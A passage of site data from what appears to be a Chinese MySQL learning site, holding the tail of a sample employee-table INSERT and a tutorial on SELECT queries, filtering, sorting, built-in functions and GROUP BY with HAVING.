00:00:00'),\n(164,'mattea','marvins','mmarvins','011.44.1346.329268','sa_rep',7200.00,0.10,147,80,'2014-03-05 00:00:00'),\n(165,'david','lee','dlee','011.44.1346.529268','sa_rep',6800.00,0.10,147,80,'2014-03-05 00:00:00'),\n(166,'sundar','ande','sande','011.44.1346.629268','sa_rep',6400.00,0.10,147,80,'2014-03-05 00:00:00'),\n(167,'amit','banda','abanda','011.44.1346.729268','sa_rep',6200.00,0.10,147,80,'2014-03-05 00:00:00'),\n(168,'lisa','ozer','lozer','011.44.1343.929268','sa_rep',11500.00,0.25,148,80,'2014-03-05 00:00:00'),\n(169,'harrison','bloom','hbloom','011.44.1343.829268','sa_rep',10000.00,0.20,148,80,'2014-03-05 00:00:00'),\n(170,'tayler','fox','tfox','011.44.1343.729268','sa_rep',9600.00,0.20,148,80,'2014-03-05 00:00:00'),\n(171,'william','smith','wsmith','011.44.1343.629268','sa_rep',7400.00,0.15,148,80,'2014-03-05 00:00:00'),\n(172,'elizabeth','bates','ebates','011.44.1343.529268','sa_rep',7300.00,0.15,148,80,'2014-03-05 00:00:00'),\n(173,'sundita','kumar','skumar','011.44.1343.329268','sa_rep',6100.00,0.10,148,80,'2014-03-05 00:00:00'),\n(174,'ellen','abel','eabel','011.44.1644.429267','sa_rep',11000.00,0.30,149,80,'2014-03-05 00:00:00'),\n(175,'alyssa','hutton','ahutton','011.44.1644.429266','sa_rep',8800.00,0.25,149,80,'2014-03-05 00:00:00'),\n(176,'jonathon','taylor','jtaylor','011.44.1644.429265','sa_rep',8600.00,0.20,149,80,'2014-03-05 00:00:00'),\n(177,'jack','livingston','jlivings','011.44.1644.429264','sa_rep',8400.00,0.20,149,80,'2014-03-05 00:00:00'),\n(178,'kimberely','grant','kgrant','011.44.1644.429263','sa_rep',7000.00,0.15,149,null,'2014-03-05 00:00:00'),\n(179,'charles','johnson','cjohnson','011.44.1644.429262','sa_rep',6200.00,0.10,149,80,'2014-03-05 00:00:00'),\n(180,'winston','taylor','wtaylor','650.507.9876','sh_clerk',3200.00,null,120,50,'2014-03-05 00:00:00'),\n(181,'jean','fleaur','jfleaur','650.507.9877','sh_clerk',3100.00,null,120,50,'2014-03-05 00:00:00'),\n(182,'martha','sullivan','msulliva','650.507.9878','sh_clerk',2500.00,null,120,50,'2014-03-05 00:00:00'),\n(183,'girard','geoni','ggeoni','650.507.9879','sh_clerk',2800.00,null,120,50,'2014-03-05 00:00:00'),\n(184,'nandita','sarchand','nsarchan','650.509.1876','sh_clerk',4200.00,null,121,50,'2014-03-05 00:00:00'),\n(185,'alexis','bull','abull','650.509.2876','sh_clerk',4100.00,null,121,50,'2014-03-05 00:00:00'),\n(186,'julia','dellinger','jdelling','650.509.3876','sh_clerk',3400.00,null,121,50,'2014-03-05 00:00:00'),\n(187,'anthony','cabrio','acabrio','650.509.4876','sh_clerk',3000.00,null,121,50,'2014-03-05 00:00:00'),\n(188,'kelly','chung','kchung','650.505.1876','sh_clerk',3800.00,null,122,50,'2014-03-05 00:00:00'),\n(189,'jennifer','dilly','jdilly','650.505.2876','sh_clerk',3600.00,null,122,50,'2014-03-05 00:00:00'),\n(190,'timothy','gates','tgates','650.505.3876','sh_clerk',2900.00,null,122,50,'2014-03-05 00:00:00'),\n(191,'randall','perkins','rperkins','650.505.4876','sh_clerk',2500.00,null,122,50,'2014-03-05 00:00:00'),\n(192,'sarah','bell','sbell','650.501.1876','sh_clerk',4000.00,null,123,50,'2014-03-05 00:00:00'),\n(193,'britney','everett','beverett','650.501.2876','sh_clerk',3900.00,null,123,50,'2014-03-05 00:00:00'),\n(194,'samuel','mccain','smccain','650.501.3876','sh_clerk',3200.00,null,123,50,'2014-03-05 00:00:00'),\n(195,'vance','jones','vjones','650.501.4876','sh_clerk',2800.00,null,123,50,'2014-03-05 00:00:00'),\n(196,'alana','walsh','awalsh','650.507.9811','sh_clerk',3100.00,null,124,50,'2014-03-05 00:00:00'),\n(197,'kevin','feeney','kfeeney','650.507.9822','sh_clerk',3000.00,null,124,50,'2014-03-05 00:00:00'),\n(198,'donald','oconnell','doconnel','650.507.9833','sh_clerk',2600.00,null,124,50,'2014-03-05 00:00:00'),\n(199,'douglas','grant','dgrant','650.507.9844','sh_clerk',2600.00,null,124,50,'2014-03-05 00:00:00'),\n(200,'jennifer','whalen','jwhalen','515.123.4444','ad_asst',4400.00,null,101,10,'2016-03-03 00:00:00'),\n(201,'michael','hartstein','mhartste','515.123.5555','mk_man',13000.00,null,100,20,'2016-03-03 00:00:00'),\n(202,'pat','fay','pfay','603.123.6666','mk_rep',6000.00,null,201,20,'2016-03-03 00:00:00'),\n(203,'susan','mavris','smavris','515.123.7777','hr_rep',6500.00,null,101,40,'2016-03-03 00:00:00'),\n(204,'hermann','baer','hbaer','515.123.8888','pr_rep',10000.00,null,101,70,'2016-03-03 00:00:00'),\n(205,'shelley','higgins','shiggins','515.123.8080','ac_mgr',12000.00,null,101,110,'2016-03-03 00:00:00'),\n(206,'william','gietz','wgietz','515.123.8181','ac_account',8300.00,null,205,110,'2016-03-03 00:00:00');\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n126\n127\n128\n129\n130\n131\n132\n133\n134\n135\n136\n137\n138\n139\n140\n141\n142\n143\n144\n145\n146\n147\n148\n149\n150\n151\n152\n153\n154\n155\n156\n157\n158\n159\n160\n161\n162\n163\n164\n165\n166\n167\n168\n169\n170\n171\n172\n173\n174\n175\n176\n177\n178\n179\n180\n181\n182\n183\n184\n185\n186\n187\n188\n189\n190\n191\n192\n193\n194\n195\n196\n197\n198\n199\n200\n201\n202\n203\n204\n205\n206\n207\n208\n209\n210\n211\n212\n",charsets:{cjk:!0}},{title:"数据查询语言DQL",frontmatter:{},regularPath:"/book-web/web%E5%90%8E%E7%AB%AF/%E5%AD%A6%E4%B9%A0mysql/2.%E6%95%B0%E6%8D%AE%E6%9F%A5%E8%AF%A2%E8%AF%AD%E8%A8%80DQL.html",relativePath:"book-web/web后端/学习mysql/2.数据查询语言DQL.md",key:"v-26ff98bc",path:"/book-web/web%E5%90%8E%E7%AB%AF/%E5%AD%A6%E4%B9%A0mysql/2.%E6%95%B0%E6%8D%AE%E6%9F%A5%E8%AF%A2%E8%AF%AD%E8%A8%80DQL.html",headers:[{level:2,title:"基础查询",slug:"基础查询",normalizedTitle:"基础查询",charIndex:16},{level:2,title:"条件查询",slug:"条件查询",normalizedTitle:"条件查询",charIndex:1144},{level:3,title:"普通条件查询",slug:"普通条件查询",normalizedTitle:"普通条件查询",charIndex:1211},{level:3,title:"模糊查询",slug:"模糊查询",normalizedTitle:"模糊查询",charIndex:1939},{level:2,title:"排序查询",slug:"排序查询",normalizedTitle:"排序查询",charIndex:3754},{level:2,title:"常见函数",slug:"常见函数",normalizedTitle:"常见函数",charIndex:4868},{level:3,title:"单行函数",slug:"单行函数",normalizedTitle:"单行函数",charIndex:4883},{level:3,title:"分组函数",slug:"分组函数",normalizedTitle:"分组函数",charIndex:4888},{level:2,title:"分组查询",slug:"分组查询",normalizedTitle:"分组查询",charIndex:12574},{level:3,title:"分组查询简单使用",slug:"分组查询简单使用",normalizedTitle:"分组查询简单使用",charIndex:12634},{level:3,title:"添加筛选条件",slug:"添加筛选条件",normalizedTitle:"添加筛选条件",charIndex:13062},{level:3,title:"",slug:"",normalizedTitle:"",charIndex:0},{level:2,title:"连接查询",slug:"连接查询",normalizedTitle:"连接查询",charIndex:13887},{level:2,title:"子查询",slug:"子查询",normalizedTitle:"子查询",charIndex:13896},{level:2,title:"分页查询",slug:"分页查询",normalizedTitle:"分页查询",charIndex:13904},{level:2,title:"联合查询",slug:"联合查询",normalizedTitle:"联合查询",charIndex:13913},{level:2,title:"查询总结",slug:"查询总结",normalizedTitle:"查询总结",charIndex:13922}],lastUpdated:"7/6/2022, 3:41:21 PM",lastUpdatedTimestamp:1657093281e3,headersStr:"基础查询 条件查询 普通条件查询 模糊查询 排序查询 常见函数 单行函数 分组函数 分组查询 分组查询简单使用 添加筛选条件  连接查询 子查询 分页查询 联合查询 查询总结",content:"# 数据查询语言DQL\n\n\n# 基础查询\n\n基础查询语法：select 查询列表 from 表名。\n\n查询列表可以是表中的字段、常量值、表达式、函数。最后查询出的结果是一个虚拟的表格。\n\n * 查询表中的单个字段\n   SELECT last_name FROM employees\n * 查询表中多个字段\n   SELECT last_name,salary,email FROM employees\n * 查询表中所有字段\n   SELECT * FROM employees\n * 查询常量值\n   SELECT 100\n * 查询表达式\n   SELECT 100%98\n * 查询函数返回值\n   SELECT VERSION()\n\n取别名：我们可以在查询时给表和列来取别名，是为了方便理解方便查看。写法：表名 [AS] 别名和列名 [AS] 别名，没错AS可以省略。我们还可以使用CONCAT()将多列拼接成同一列展示，最后使用别名作为查询结果新列名。\n\n# 取别名，带上AS，别名最好是加上双引号，因为可能是多单词组成\nSELECT 100%98 AS \"结果\";\n# 取别名，带上AS，别名最好是加上双引号，因为可能是多单词组成\nSELECT last_name AS \"姓\", first_name AS \"名\" FROM employees;\n# 取别名，省略AS，别名最好是加上双引号，因为可能是多单词组成\nSELECT salary \"out put\" FROM employees;\n# CONCAT()搭配别名使用\nSELECT CONCAT(last_name,first_name) AS \"姓名\" FROM employees;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n去重：在某些表里，在查询一些字段的值时结果可能会出现重复，那么我们可以使用DISTINCT关键字了。\n\n# 使用DISTINCT关键字进行查询结果去重\nSELECT DISTINCT department_id FROM employees;\n\n\n1\n2\n\n\n+加号：+在MYSQL中的作用是加号运算\n\n * 如果两个都是数值型，就只加做加法运算 SELECT 10+90 AS \"结果\"\n * 只有其中一个为NULL，那结果就是NULL SELECT NULL+90 AS \"结果\"\n * 如果其中一个是数值型，另一个是数值型字符，那就会将数值型字符转为对应数值，再做加法运算。 SELECT '10'+90 AS \"结果\"\n * 如果其中一个是数值型，另一个是非数值字符型，那就会将非数值字符型转为数值0，再做加法运算。 SELECT 'john'+90 AS \"结果\"\n\n\n# 条件查询\n\n条件查询就是字面意思，按照某些条件进行查询。\n\n写法：select 查询列表 from 表名 where 条件。\n\n\n# 普通条件查询\n\n普通条件查询一般是按照“条件”进行查询，它会用到条件运算符：>、<、=、<=、>=、<>、!=。（“不等于”建议使用<>）\n\n一旦“条件”很复杂，满足所有条件、满足其中一个条件、相反条件等，就会用到逻辑运算符：and、or、not、&&、||、!。（建议使用前三个）\n\n# >、<：查询工资大于12000的员工信息\nSELECT * FROM employees WHERE salary > 12000;\n# <>、!=：查询部门编号不等于90号的员工名和部门编号。`<>`也可以用`!=`，最好用前者\nSELECT last_name,department_id FROM employees WHERE department_id<>90;\n# AND、&&：查询工资在10000到20000之间的员工名、工资。`AND`也可以用`&&`，最好用前者\nSELECT last_name,salary FROM employees WHERE salary>=10000 AND salary<=20000;\n# OR：查询部门编号不是在90到110之间，或者工资高于15000的员工信息\nSELECT * FROM employees WHERE department_id<90 OR department_id>110 OR salary>15000;\n# NOT、AND、OR：同上例\nSELECT * FROM employees WHERE NOT(department_id>=90 AND department_id<=110) OR salary>15000;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# 模糊查询\n\n模糊查询是“条件”很简略，可能是字段值的某一部分，也可能是在一个范围内。它有LIKE、BETWEEN AND、IN、IS NULL、IS NOT NULL几种模糊查询类型。\n\n 1. LIKE:一般和通配符搭配使用，通配符%表示任意多个字符，_表示任意单个字符。如果需要区分大小写，可以在LIKE后追加BINARY关键字。如果需要查_本身这个符号，可以使用转译\\_（或者用ESCAPE关键字指定某个字符代表\\，该字符没有字符原来意义了而是具有了转译功能）。\n    \n    # %为任意多个字符：查询员工名中包含字符a的员工信息\n    SELECT * FROM employees WHERE last_name LIKE '%a%';\n    # _为任意单个字符：查询员工名中第三个字符是e第五个字符是n的员工信息\n    SELECT * FROM employees WHERE last_name LIKE '__e_n%';\n    # 加上BINARY可区分大小写：查询员工名中第四个字符是大写H的员工信息\n    SELECT * FROM employees WHERE last_name LIKE BINARY '___H%';\n    # 使用\\进行转译：查询员工名中第二个字符是_的员工信息\n    SELECT * FROM employees WHERE last_name LIKE '_\\_%';\n    # 使用ESCAPE指定某字符具有转译功能，该字符本身已经不是它原来的意思了。本例同'_\\_%'一样。\n    SELECT * FROM employees WHERE last_name LIKE '_a_%' ESCAPE 'a';\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    \n\n 2. BETWEEN AND：范围查询，它相当于xx >= 下限 AND xx <= 上限，只是BETWEEN 下限 AND 上限更简洁，BETWEEN AND会包含上下限这两个临界值。\n    \n    # BETWEEN AND（包含临界值）：查询工资在10000到20000之间的员工名、工资\n    SELECT last_name,salary FROM employees WHERE salary BETWEEN 10000 AND 20000;\n    \n    \n    1\n    2\n    \n\n 3. IN：相当于xx=值1 OR xx=值2 OR xx=值3，用IN的写法会更简洁，IN(值1,值2,值3)，只是“值123”的类型要一致或者兼容（可隐式转换），还有“值123”不要使用通配符，因为IN实际是=形式的，不是LIKE所以不能用通配符。\n    \n    # IN：查询员工工种编号是IT_PROG或者AD_VP或者ST_MAN的员工信息\n    SELECT * FROM employees WHERE job_id IN('IT_PROG','AD_VP','ST_MAN');\n    \n    \n    1\n    2\n    \n\n 4. IS NULL和IS NOT NULL：判断字段值是否为NULL的。\n    \n    # IS NULL和IS NOT NULL：查询奖金为空的员工信息\n    SELECT * FROM employees WHERE commission_pct IS NULL;\n    \n    \n    1\n    2\n    \n    \n    说到IS NULL，其实它可以用安全等于<=>实现。IS NULL只能用在NULL的场景，而<=>可以适用于NULL也可以适用于具体值场景。\n    \n    # <=>是安全等于，用于判断是否等于NULL，也可用于是否等于一个具体值，但是用得很少\n    SELECT * FROM employees WHERE commission_pct <=> NULL;\n    SELECT * FROM employees WHERE salary <=> 12000;\n    \n    \n    1\n    2\n    3\n    \n\n\n# 排序查询\n\n排序：我们有时候需要把查询结果按照一个字段值的升序或降序进行排列展示，那我们可以使用ORDER BY关键字了。ASC升序（默认），DESC是降序。ORDER BY支持单字段、多字段、表达式、函数、别名。ORDER BY字句一般放在查询语句的最后面（但LIMIT字句比它更靠后）。\n\n 1. 普通排序\n    \n    # 使用ORDER BY进行排序，ASC升序（默认），DESC是降序\n    SELECT * FROM employees ORDER BY salary;\n    # 加上WHERE条件进行排序查询\n    SELECT * FROM employees WHERE salary>=12000 ORDER BY salary;\n    \n    \n    1\n    2\n    3\n    4\n    \n\n 2. 按表达式排序\n    \n    # 按表达式排序：按年薪的高低显示员工信息和年薪\n    SELECT *, salary*12*(1+IFNULL(commission_pct,0))\n    FROM employees\n    ORDER BY salary*12*(1+IFNULL(commission_pct,0)) DESC;\n    \n    \n    1\n    2\n    3\n    4\n    \n\n 3. 按别名排序\n    \n    # 按别名排序：按年薪的高低显示员工信息和年薪\n    SELECT *, salary*12*(1+IFNULL(commission_pct,0)) 年薪\n    FROM employees\n    ORDER BY 年薪 DESC;\n    \n    \n    1\n    2\n    3\n    4\n    \n\n 4. 按函数排序\n    \n    # 按函数排序：按姓名的长度显示员工的姓名和工资\n    SELECT LENGTH(last_name) 字节长度,last_name,salary\n    FROM employees\n    ORDER BY LENGTH(last_name) DESC;\n    \n    \n    1\n    2\n    3\n    4\n    \n\n 5. 按多个字段排序\n    \n    # 按多个字段排序：查询员工信息，先按工资降序排序，再按员工编号升序排序\n    SELECT * FROM employees ORDER BY salary DESC, employee_id ASC;\n    \n    \n    1\n    2\n    \n\n\n# 常见函数\n\n常见函数一般分为：单行函数和分组函数。单行函数是处理数据用的，分组函数是统计数据用的，所以分组函数还叫统计函数、聚合函数或者组函数。\n\n\n# 单行函数\n\n 1. 字符函数\n    \n    * length()：获取参数值的字节个数。要注意不是字符长度。\n    * concat()：拼接字符串。\n    * upper()和lower()：前者是将字母都变为大写，后者是将字母都变为小写。\n    * substr()或substring()：这两个一样，截取字符串。\n    * instr()：查询子串在字符串的索引位置（类似js的indexOf()）。\n    * trim()：去掉字符串前后空格。如果使用FORM可以去掉前后指定字符。\n    * lpad()和rpad()：用指定字符进行左填充（rpad是右填充），最后达到指定字符长度。\n    * replace()：替换字符串中的指定的字符。\n    \n    # length函数：获取参数值的字节个数。\n    SELECT LENGTH(last_name) FROM employees;\n    # concat函数：拼接字符串。\n    SELECT CONCAT(last_name,'_',first_name) FROM employees;\n    # upper和lower函数：前者是将字母都变为大写，后者是将字母都变为小写。\n    SELECT UPPER(last_name),LOWER(first_name) FROM employees;\n    # substr或substring函数：截取字符串，第二个参数是起始点，第三个参数是截取长度\n    SELECT last_name, SUBSTR(last_name,1,3) FROM employees; # mysql索引是从1开始的\n    # instr函数：查询子串在字符串的索引位置\n    SELECT INSTR('akldmfasdfabodfng','mfa');\n    # trim函数：去掉前后空格（或指定字符）\n    SELECT TRIM('  A  S    ');\n    SELECT TRIM('G' FROM 'GGGGGAGGGGSGGGGG');\n    # lpad函数：用指定字符进行左填充（rpad是右填充），最后达到指定字符长度\n    SELECT LPAD('abc',10,'*'), RPAD('abc',10,'*');\n    # replace函数：替换字符串中的指定的字符\n    SELECT REPLACE('abcabcabc','abc','def');\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    \n\n 2. 数学函数\n    \n    * round()：四舍五入，第二个参数是指定保留小数点后的位数。\n    * ceil()：向上取整，返回>=该参数的最小整数。\n    * floor()：向下取整，返回<=该参数的最大整数。\n    * truncate()：截断小数位，会指定截断到小数点后的位数。\n    * mod()：取余，mod(a,b)相当于a - a/b*b。\n    \n    # round函数：四舍五入，第二个参数是指定保留小数点后的位数\n    SELECT ROUND(1.42), ROUND(-1.56), ROUND(1.567,2);\n    # ceil函数：向上取整，返回>=该参数的最小整数\n    SELECT CEIL(1.00), CEIL(1.02), CEIL(-1.02);\n    # floor函数：向下取整，返回<=该参数的最大整数\n    SELECT FLOOR(2.00), FLOOR(2.98), FLOOR(-2.98);\n    # truncate函数：截断小数位，会指定截断到小数点后的位数\n    SELECT TRUNCATE(1.6999, 0), TRUNCATE(1.6999, 2);\n    # mod函数：取余，`mod(a,b)`相当于`a - a/b*b`\n    SELECT MOD(10,3),MOD(10,-3),MOD(-10,3),MOD(-10,-3);\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    \n\n 3. 日期函数\n    \n    * now()：返回当前系统日期+时间。\n    * curdate()：返回当前系统日期，不包括时间。\n    * curtime()：返回当前系统时间，不包括日期。\n    * str_to_date()：按照指定格式来解析日期+时间。\n    * date_format()：将日期按照指定格式来转换。\n    * year()：获取参数值的年部分。\n    * month()和monthname()：获取参数值的月部分。\n    * day()：获取参数值的日部分（一个月的第几天）。\n    * hour：获取参数值的小时部分。\n    * minute：获取参数值的分钟部分。\n    * second：获取参数值的秒部分。\n    * date()：获取参数值的整体日期部分，不包括时间。\n    \n    str_to_date()和date_format()中会涉及的“格式”，经常会用到的一些格式符如下表：\n    \n    格式符   功能\n    %Y    四位年份\n    %y    两位年份\n    %m    月份（01,02,03...12）\n    %c    月份（1,2,3...12）\n    %d    月份中的第几天（01,02,03...31）\n    %e    月份中的第几天（1,2,3...31）\n    %H    小时（24小时制，00,02,03...23）\n    %k    小时（24小时制，0,1,2,3...23）\n    %h    小时（12小时制，01,02,03...12）\n    %l    小时（12小时制，1,2,3...12）\n    %i    分钟（01,02,03...59）\n    %s    秒（01,02,03...59）\n    %p    AM 或者 PM\n    %w    星期几（0=星期日.. 6=星期六）\n    %W    星期几（Sunday.. Saturday）\n    \n    # now函数返回当前系统日期+时间，curdate只返回日期，curtime只返回时间\n    SELECT NOW(),CURDATE(),CURTIME();\n    # str_to_date函数：按照指定格式来解析日期+时间\n    SELECT STR_TO_DATE('1992-8-15','%Y-%c-%d'),STR_TO_DATE('1992-08-15','%Y-%m-%d');\n    # 查询入职日期为1992-4-3的员工信息\n    SELECT * FROM employees WHERE hiredate = STR_TO_DATE('4-3 1992','%c-%d %Y');\n    # date_format函数：将日期按照指定格式来转换\n    SELECT DATE_FORMAT(NOW(), '%y年%c月%e日');\n    # 查询有奖金的员工名和入职日期（xx月/xx日 xx年）\n    SELECT last_name AS 员工名,DATE_FORMAT(hiredate, '%m月/%d日 %y年') 入职时间\n    FROM employees WHERE commission_pct IS NOT NULL;\n    # year和day函数：获取年和日\n    SELECT YEAR(NOW()),MONTH(NOW()),MONTHNAME(NOW()),\n    DAY(NOW()),HOUR(NOW()),MINUTE(NOW()),SECOND(NOW());\n    # date获取整体的日期，不包括时间\n    SELECT DATE(NOW());\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    \n\n 4. 流程控制函数\n    \n    * if(expr1,expr2,expr3)：如果expr1为true，就返回expr2，否则返回expr3。\n    \n    * case()有两种写法：\n      \n      # 这种写法的逻辑类似于`switch case`等值判断\n      case 要判断的字段或表达式\n      when 常量1 then 要显示的值1（在存储过程中是语句）\n      when 常量2 then 要显示的值2（在存储过程中是语句）\n      ...\n      else 要显示的值n（在存储过程中是语句）\n      end\n      \n      \n      1\n      2\n      3\n      4\n      5\n      6\n      7\n      \n      \n      # 这种写法的逻辑类似于`if else if else`这种区间判断\n      case\n      when 条件1 then 要显示的值1（在存储过程中是语句）\n      when 条件2 then 要显示的值2（在存储过程中是语句）\n      ...\n      else 要显示的值n（在存储过程中是语句）\n      end\n      \n      \n      1\n      2\n      3\n      4\n      5\n      6\n      7\n      \n    \n    * 例子：\n      \n      # if(expr1,expr2,expr3)：如果expr1为true，就返回expr2，否则返回expr3\n      SELECT IF(10>5,'真的','假的');\n      # 使用if给员工奖金加备注\n      SELECT last_name, IF(commission_pct IS NULL, '没有奖金', '有奖金') AS 奖金 FROM employees;\n      # case函数：类似于js中switch和if else。\n      /*\n      查询员工的工资，要求\n      部门号=30，显示的工资为1.1倍\n      部门号=40，显示的工资为1.2倍\n      部门号=50，显示的工资为1.3倍\n      其他部门，显示的工资为原工资\n      */\n      SELECT salary AS 原工资, department_id,\n      CASE department_id\n      WHEN 30 THEN salary*1.1\n      WHEN 40 THEN salary*1.2\n      WHEN 50 THEN salary*1.3\n      ELSE salary\n      END AS 新工资 FROM employees;\n      /*\n      查询员工工资情况\n      如果工资>20000，显示A级别\n      如果工资>15000，显示B级别\n      如果工资>10000，显示C级别\n      否则，显示D级别\n      */\n      SELECT salary 工资,\n      CASE\n      WHEN salary>20000 THEN 'A'\n      WHEN salary>15000 THEN 'B'\n      WHEN salary>10000 THEN 'C'\n      ELSE 'D'\n      END AS 工资级别 FROM employees;\n      \n      \n      1\n      2\n      3\n      4\n      5\n      6\n      7\n      8\n      9\n      10\n      11\n      12\n      13\n      14\n      15\n      16\n      17\n      18\n      19\n      20\n      21\n      22\n      23\n      24\n      25\n      26\n      27\n      28\n      29\n      30\n      31\n      32\n      33\n      \n\n\n# 分组函数\n\n分组函数用作统计使用，又称为聚合函数或统计函数或组函数。\n\n分组函数常见的有：sum求和、avg平均值、max最大值、min最小值、count计算个数。\n\n# SUM函数：求和。求所有员工工资总和\nSELECT SUM(salary) FROM employees;\n# AVG函数：求平均值。求员工工资的平均值\nSELECT AVG(salary) FROM employees;\n# MIN函数：求最小值。求员工中工资最小的\nSELECT MIN(salary) FROM employees;\n# MAX函数：求最大值。求员工中工资最大的\nSELECT MAX(salary) FROM employees;\n# COUNT函数：有多少个非空数据行。求有多少员工有工资信息\nSELECT COUNT(salary) FROM employees;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n分组函数使用特点：\n\n 1. sum、avg一般用于处理数值型；max、min、count可以处理任何类型。\n    \n    # SUM函数和AVG函数一般处理数值型，处理其他的虽然不报错但没什么意义\n    SELECT SUM(last_name),AVG(last_name) FROM employees;\n    SELECT SUM(hiredate),AVG(hiredate) FROM employees;\n    # MIN函数、MAX函数和COUNT函数可以处理任何类型\n    SELECT MAX(last_name),MIN(last_name) FROM employees;\n    SELECT MAX(hiredate),MIN(hiredate) FROM employees;\n    # COUNT函数只统计非空的数据\n    SELECT COUNT(last_name) FROM employees;\n    SELECT COUNT(commission_pct) FROM employees;\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    \n\n 2. 分组函数都会忽略Null值。\n    \n    # SUM函数和AVG函数都会忽略null值。null+任何值都是null。平均值实际除以的是35，不包括null行\n    SELECT SUM(commission_pct),AVG(commission_pct),SUM(commission_pct)/35 FROM employees;\n    # MAX函数和MIN函数都会忽略null值。不然最大最小值就会有null。\n    SELECT MAX(commission_pct),MIN(commission_pct) FROM employees;\n    # COUNT函数只统计非空的数据\n    SELECT COUNT(last_name) FROM employees;\n    SELECT COUNT(commission_pct) FROM employees;\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    \n\n 3. 分组函数可以搭配DISTINCT使用，一般是count函数和DISTINCT搭配使用的多。\n    \n    # 分组函数可搭配DISTINCT使用，主要是count函数搭配它。查询工资有几种\n    SELECT COUNT(DISTINCT salary),COUNT(salary) FROM employees;\n    \n    \n    1\n    2\n    \n\n 4. 统计表的行数，可以用count(*)、count(常量)、count(列名)，其中count(*)用得最多。\n    \n    # 用COUNT统计表的函数，有`count(*)`、`count(常量)`、`count(列名)`三种\n    SELECT COUNT(employee_id) FROM employees;\n    # COUNT(*)表示这一行里只有一列的值不为Null就统计上\n    SELECT COUNT(*) FROM employees;\n    # COUNT(1)其实是临时加了一列，然后让这一列所有行的值都为1，并统计总行数\n    SELECT COUNT(1) FROM employees;\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    \n\n 5. 和分组函数一同查询的字段有限制（一般是group by后的字段）\n    \n    # 和分组函数一同查询的字段有限制。这个employee_id查出来就没有意义了\n    SELECT AVG(salary), employee_id FROM employees;\n    \n    \n    1\n    2\n    \n\n\n# 分组查询\n\n分组查询是对表按照某个列进行分组，再对每组的情况进行一个统计（每组的某列的平均值、最大最小值等）。\n\n\n# 分组查询简单使用\n\n写法：\n\nselect 分组函数, 列（要求出现在group by的后面）\nfrom 表名\n【where 筛选条件】\ngroup by 分组的列表\n【order by 字句】\n\n\n1\n2\n3\n4\n5\n\n\n我们可以看到上面写法中的查询列表是“分组函数”和“列”。这个“列”就是group by后面的字段，表示按照什么字段进行分组；这个“分组函数”就是对组里的什么字段进行一个什么样的统计。\n\n# 查询每个工种的最高工资。\nSELECT MAX(salary), job_id  # 统计每组的最高的salary\nFROM employees\nGROUP BY job_id;            # 按照job_id进行分组\n# 查询每个位置上的部门个数\nSELECT COUNT(*),location_id\nFROM departments\nGROUP BY location_id;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# 添加筛选条件\n\n分组查询中的筛选条件分为两类：\n\n        数据源       位置              关键字\n分组前筛选   原始表       group by子句的前面   where\n分组后筛选   分组后的结果集   group by子句的后面   having\n\n使用注意点：\n\n * 分组函数做条件肯定是放在having字句中的，也就是“分组后筛选”\n * 能用分组前筛选的，就优先考虑使用分组前筛选。\n\n添加分组前筛选例子：\n\n# 查询邮箱中包含a字符的，每个部门的平均工资\nSELECT AVG(salary), department_id\nFROM employees\nWHERE email LIKE '%a%'\nGROUP BY department_id;\n# 查询有奖金的，每个领导手下员工的最高工资\nSELECT MAX(salary),manager_id\nFROM employees\nWHERE commission_pct IS NOT NULL\nGROUP BY manager_id;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n添加分组后筛选（使用HAVING关键字）例子：\n\n# 查询哪个部门的员工个数>2（分组后的刷选）\nSELECT COUNT(*), department_id\nFROM employees\nGROUP BY department_id\nHAVING COUNT(*) > 2;\n# 查询每个工种有奖金的员工的最高工资>12000的工种编号和最高工资\nSELECT MAX(salary), job_id\nFROM employees\nWHERE commission_pct IS NOT NULL\nGROUP BY job_id\nHAVING MAX(salary) > 12000;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n#\n\n\n# 连接查询\n\n\n# 子查询\n\n\n# 分页查询\n\n\n# 联合查询\n\n\n# 查询总结",normalizedContent:"# 数据查询语言dql\n\n\n# 基础查询\n\n基础查询语法：select 查询列表 from 表名。\n\n查询列表可以是表中的字段、常量值、表达式、函数。最后查询出的结果是一个虚拟的表格。\n\n * 查询表中的单个字段\n   select last_name from employees\n * 查询表中多个字段\n   select last_name,salary,email from employees\n * 查询表中所有字段\n   select * from employees\n * 查询常量值\n   select 100\n * 查询表达式\n   select 100%98\n * 查询函数返回值\n   select version()\n\n取别名：我们可以在查询时给表和列来取别名，是为了方便理解方便查看。写法：表名 [as] 别名和列名 [as] 别名，没错as可以省略。我们还可以使用concat()将多列拼接成同一列展示，最后使用别名作为查询结果新列名。\n\n# 取别名，带上as，别名最好是加上双引号，因为可能是多单词组成\nselect 100%98 as \"结果\";\n# 取别名，带上as，别名最好是加上双引号，因为可能是多单词组成\nselect last_name as \"姓\", first_name as \"名\" from employees;\n# 